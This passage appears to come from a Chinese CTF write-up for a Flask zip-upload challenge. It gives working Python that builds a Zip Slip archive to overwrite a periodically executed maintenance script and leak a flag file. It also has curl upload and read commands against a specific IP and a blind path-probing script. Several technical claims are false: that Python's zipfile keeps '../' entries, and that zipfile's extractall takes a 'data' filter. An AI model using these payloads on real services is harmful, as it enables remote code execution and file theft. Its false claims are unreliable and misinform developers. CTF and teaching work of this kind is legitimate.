2. **有后台 daemon 周期性执行运维脚本** → 我们覆盖运维脚本就能 RCE。
3. **日志写到 `_output.txt`** → 知道往哪去找回显 / 利用点。

## 二、Zip Slip 漏洞原理（必看）

Python 标准库 `zipfile.extractall()` 在 CPython 中（≤3.12）解压每个 entry
时，**只去掉了开头的 `/`**，但 **不会清理路径中的 `../`**。

也就是说，如果 zip 中存在文件名

```
../../etc/passwd
```

解压到 `/app/extracted/<uuid>/` 时，最终落地路径就是

```
/app/extracted/<uuid>/../../etc/passwd   →   /etc/passwd
```

**任意写！** 这就是 *Zip Slip*。

我们之所以能用，是因为 ZipBox 用的是 Python 的 `zipfile`，没做任何
路径净化。可以靠这条原语：

| 想写到的位置          | zip 内的 entry 名         |
| --------------------- | --------------------------- |
| `/app/extracted/xx`   | `../xx`                     |
| `/app/xx`             | `../../xx`                  |
| `/etc/xx`             | `../../../etc/xx`           |

## 三、手工复刻（最简单的几步）

### 1. 探活

```bash
curl http://47.120.76.57:34802/
```

### 2. 用 Python 构造一个 zip-slip ZIP

```python
import zipfile

PAYLOAD = (
    "#!/bin/sh\n"
    "cat /flag.txt > /app/extracted/leak.txt 2>&1\n"
)

with zipfile.ZipFile("evil.zip", "w") as z:
    # ../../ 跳出 uuid 目录到 /app/，写一个运维脚本会用的名字
    zi = zipfile.ZipInfo("../../run.sh")
    zi.external_attr = (0o755 << 16)         # 给执行权限
    z.writestr(zi, PAYLOAD)
    # 也覆盖一下 _output.txt（题目里已经存在）
    zi2 = zipfile.ZipInfo("../../_output.txt")
    zi2.external_attr = (0o755 << 16)
    z.writestr(zi2, PAYLOAD)
    # 随便塞个普通文件，避免 zip 为空被拒绝
    z.writestr("placeholder.txt", b"x")
```

### 3. 上传

```bash
curl -F "file=@evil.zip" http://47.120.76.57:34802/upload
# 返回 {"files":["../../run.sh","../../_output.txt","placeholder.txt"], "id":"xxxx"}
# 注意 ../../run.sh 出现在 files 列表里，说明 zip slip 成功落地
```

### 4. 等 daemon 周期执行（通常 1~5 分钟）

```bash
# 浏览器或 curl 读 leak.txt
curl 'http://47.120.76.57:34802/view?name=leak.txt'
# 输出里就有 flag
```

> 如果 leak.txt 还没出来，先读 `view?name=_output.txt`，
> 也可能是 daemon 直接把命令结果回写到 `_output.txt`。

### 5. 提交 flag

格式：`TOGOGO-flag{...}`

## 四、关键探测技巧

### 4.1 探测远程文件 / 目录是否存在

`zipfile.extractall()` 在解压 `dir/file.txt` 时会先 `os.makedirs(dir)`，
当 `dir` 已经是 **文件** 时就会抛 `Errno 20 Not a directory`，
当 `dir` 已经是 **目录** 时会抛 `Errno 17 File exists`（如果用 makedirs(exist_ok=False)）。

利用 server 透传的错误信息我们可以盲枚举目标系统：

```python
import zipfile, requests
def probe(path):
    with zipfile.ZipFile("/tmp/p.zip","w") as z:
        z.writestr(zipfile.ZipInfo(f"../../../{path}/anything.txt"), "x")
    r = requests.post("http://47.120.76.57:34802/upload",
                      files={"file": open("/tmp/p.zip","rb")})
    print(path, "->", r.text[:200])

probe("flag.txt")    # Errno 20 → /flag.txt 是文件 ✔
probe("flag")        # 看 / 下有无 flag 目录
probe("app/.git")    # Errno 20 → .git 是文件（submodule 形态）
```

这是这道题里 **找到 `/flag.txt`** 的关键手段。

### 4.2 `/view` 的边界

`/view?name=` 用了 `safe_join('/app/extracted', name)`：

| name 写法                         | 结果 |
|-----------------------------------|------|
| `poc1.txt`                        | 200，读 `/app/extracted/poc1.txt`       |
| `f541cca9a856/../poc1.txt`        | 200，等价于 `poc1.txt`                  |
| `../poc1.txt`                     | 404，越界被拒                          |
| `../../app.py`                    | 404                                     |
| `/etc/passwd`                     | 404                                     |

所以 **要拿 flag，必须让 daemon 把内容写进 `/app/extracted/` 里**。

### 4.3 为什么要往 `/app/` 写运维脚本

提示里说：「后台小工具会**周期性执行运维脚本**，回写日志到 `_output.txt`」。
配合 Zip Slip 的任意写，最稳的姿势就是 **覆盖运维脚本** 让它在下一个
周期内执行我们的命令。脚本里把 `cat /flag.txt` 输出到 `/app/extracted/leak.txt`，
就能用 `/view?name=leak.txt` 把 flag 取回来。

> 如果不知道运维脚本到底叫什么，就把常见名字（run.sh / task.sh /
> tick.sh / cron.sh / scheduler.py …）批量覆盖一遍，命中即可。
> 务必 **不要往 /app 下直接写 `templates`, `static`, `.git` 等已存在的文件**，
> 否则可能把 Flask 本身写坏。

## 五、踩坑记录

1. **不要上传 zip bomb 试图让 Flask 崩溃后重启** —— 本题环境没有
   `restart=always`，一旦把 Werkzeug 玩死，端口会持续 connection refused，
   等运维重启才能继续。
2. **覆盖目录会失败**：CPython zipfile 解压时若把 `xxx` 这种文件名扔进去，
   而 `xxx` 已是目录，会抛 `IsADirectoryError`，整个 extractall 立刻失败、
   后续文件都不会落地。所以要么写 `dir/file` 形式，要么先别动同名目录。
3. **`/view` 不接受任何 `..` 越界**，所以攻击的回显文件必须落在
   `/app/extracted/` 内（写 `../leak.txt` 也行，会落到 extracted 根）。
4. **后台 daemon 周期较长**：5～10 分钟一次很常见，耐心等。

## 七、知识扩展

* CVE 类比：CVE-2018-1002201（Apache Commons Compress Zip Slip）、
  CVE-2018-8013（Pivotal Spring）等大量软件都栽在解压时不清理 `../`。
* 修复手法：解压前用 `os.path.realpath(os.path.join(base, name))` 计算落地路径，
  再 `os.path.commonpath([base, target]) == base` 校验是否越界。Python 3.12+
  的 `zipfile.ZipFile.extractall(filter='data')` 也可以拦截这种 entry。
* 在企业项目里：解压第三方上传的 zip / tar / 7z **都要做 path 校验**，
  不只是 zip。tar 还多一个 symlink 攻击面。
